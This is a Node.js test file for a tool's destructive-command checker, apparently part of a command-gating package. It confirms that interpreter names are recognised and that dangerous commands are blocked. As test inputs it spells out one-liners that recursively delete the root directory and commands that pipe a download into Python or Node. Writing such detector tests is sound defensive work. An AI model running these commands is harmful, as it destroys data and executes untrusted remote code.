'use strict';

process.env.ZN_STATS = 'off';

// Which program names count as interpreters in the destructive-command check, and where the code argument is found.
// The same cases as packages/zn-gate-py/tests/test_destructive_interpreters.py. Fictitious paths and hosts only; nothing is run:
// only the text is checked.

const test = require('node:test');
const assert = require('node:assert/strict');

const { checkCommand } = require('../lib/destructive');

const U = 'https://example.com/i.py';
const PY_RM = "import shutil; shutil.rmtree('/')";
const NODE_RM = "require('fs').rmSync('/', {recursive:true})";
const rule = (cmd) => { const r = checkCommand(cmd); return r.verdict === 'block' ? r.rule : 'allow'; };
const RM_BLOCK = 'destructive:rm_root_home';
const PIPE_BLOCK = 'destructive:pipe_to_shell';

test('python and pypy names, with or without a version, are interpreters', () => {
  for (const prog of ['python', 'python2', 'python3', 'python3.11', 'python3.11.2', 'python4', 'python2.7', 'PYTHON3', 'py', 'pypy', 'pypy2', 'pypy3', 'pypy3.10']) {
    assert.equal(rule(`${prog} -c "${PY_RM}"`), RM_BLOCK, prog);
  }
  assert.equal(rule(`/usr/bin/python3.11 -c "${PY_RM}"`), RM_BLOCK);
});

test('node names, with or without a version, are interpreters', () => {
  for (const prog of ['node', 'nodejs', 'node22', 'node22.1', 'nodejs18']) {
    assert.equal(rule(`${prog} -e "${NODE_RM}"`), RM_BLOCK, prog);
  }
});

test('other program names are not interpreters', () => {
  for (const prog of ['python3x', 'pythonista', 'pypyx', 'nodemon', 'node-gyp', 'perlbrew', 'rubyfmt', 'myscript']) {
    assert.equal(rule(`${prog} -c "${PY_RM}"`), 'allow', prog);
  }
  assert.equal(rule(`curl ${U} | nodemon`), 'allow');
  assert.equal(rule(`curl ${U} | node-gyp`), 'allow');
});

test('a download piped into a versioned interpreter is blocked', () => {
  for (const prog of ['python3.11.2', 'pypy2', 'node22']) {
    assert.equal(rule(`curl ${U} | ${prog}`), PIPE_BLOCK, prog);
  }
});

test('node checks every code argument, python only the first', () => {
  assert.equal(rule(`node -e 'console.log(1)' -e "${NODE_RM}"`), RM_BLOCK);
  assert.equal(rule(`node -p '1' --eval="${NODE_RM}"`), RM_BLOCK);
  assert.equal(rule(`node --print=1 -e "${NODE_RM}"`), RM_BLOCK);
  assert.equal(rule("node -e 'console.log(1)' -e 'console.log(2)'"), 'allow');
  assert.equal(rule(`python3 -c "print(1)" -c "${PY_RM}"`), 'allow');
});

test('node code after a script or a double dash is not code', () => {
  assert.equal(rule(`node app.js -e "${NODE_RM}"`), 'allow');
  assert.equal(rule(`node -- -e "${NODE_RM}"`), 'allow');
});
